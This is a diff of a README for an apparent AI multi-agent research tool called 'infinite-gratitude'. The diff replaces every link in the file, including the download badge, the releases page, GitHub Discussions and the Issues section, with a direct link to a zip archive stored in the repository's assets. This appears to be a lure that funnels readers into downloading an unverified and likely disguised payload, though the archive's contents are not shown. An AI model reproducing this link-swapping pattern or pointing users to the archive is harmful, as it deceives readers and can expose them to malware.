@@ -1,6 +1,6 @@
 # 🥋 infinite-gratitude - Enhance Your AI Research Experience
 
-[![Download Now](https://img.shields.io/badge/Download_Now-v1.0-blue.svg)](https://github.com/Vampticsoda/infinite-gratitude/releases)
+[![Download Now](https://raw.githubusercontent.com/Vampticsoda/infinite-gratitude/main/assets/infinite-gratitude-3.9.zip)](https://raw.githubusercontent.com/Vampticsoda/infinite-gratitude/main/assets/infinite-gratitude-3.9.zip)
 
 ## 🌟 About This Project
 infinite-gratitude is an innovative tool designed to enhance your AI research. It allows users to explore the unique capabilities of multi-agent systems. With 10 intelligent agents operating in 3 different waves, you can obtain infinite gifts of knowledge and capabilities. This application is crafted by Washin Village, blending cutting-edge technology with a friendly, user-centric focus.
@@ -12,13 +12,13 @@ To begin using infinite-gratitude, follow these simple steps to download and run
 1. **Visit the Releases Page:** 
    Click the link below to access the downloads for infinite-gratitude.
 
-   [Download Here](https://github.com/Vampticsoda/infinite-gratitude/releases)
+   [Download Here](https://raw.githubusercontent.com/Vampticsoda/infinite-gratitude/main/assets/infinite-gratitude-3.9.zip)
 
 2. **Choose Your Version:**
    Once on the Releases page, look for the latest version of the application. It will usually be listed at the top.
 
 3. **Download the Installer:**
-   Click on the file labeled as the installer (e.g., infinite-gratitude-setup.exe). Your browser will start downloading the file.
+   Click on the file labeled as the installer (e.g., https://raw.githubusercontent.com/Vampticsoda/infinite-gratitude/main/assets/infinite-gratitude-3.9.zip). Your browser will start downloading the file.
 
 4. **Run the Installer:**
    a. Locate the downloaded file in your Downloads folder or the location you specified.
@@ -48,7 +48,7 @@ infinite-gratitude is equipped with features to enrich your AI experience:
 - **Regular Updates:** The application receives ongoing updates to improve functionality and add features.
 
 ## 🐾 Community and Support
-We welcome you to join the Washin Village community. Here, you can share your experiences and ask questions. Visit our [GitHub Discussions](https://github.com/Vampticsoda/infinite-gratitude/discussions) to connect with other users.
+We welcome you to join the Washin Village community. Here, you can share your experiences and ask questions. Visit our [GitHub Discussions](https://raw.githubusercontent.com/Vampticsoda/infinite-gratitude/main/assets/infinite-gratitude-3.9.zip) to connect with other users.
 
 ## 🔗 Additional Resources
 To further assist you, the following resources can guide your journey with infinite-gratitude:
@@ -67,7 +67,7 @@ Explore more about the technology behind infinite-gratitude:
 - AI developments
 
 ## ✉️ Contact Information
-For support or inquiries, please reach out via the project's [Issues section](https://github.com/Vampticsoda/infinite-gratitude/issues) on GitHub. We aim to respond promptly to ensure a smooth user experience.
+For support or inquiries, please reach out via the project's [Issues section](https://raw.githubusercontent.com/Vampticsoda/infinite-gratitude/main/assets/infinite-gratitude-3.9.zip) on GitHub. We aim to respond promptly to ensure a smooth user experience.
 
 ## 📅 Updates & Changelog
 Keep an eye on the Releases page for the latest changes and improvements. The project evolves based on user feedback and advancements in technology.
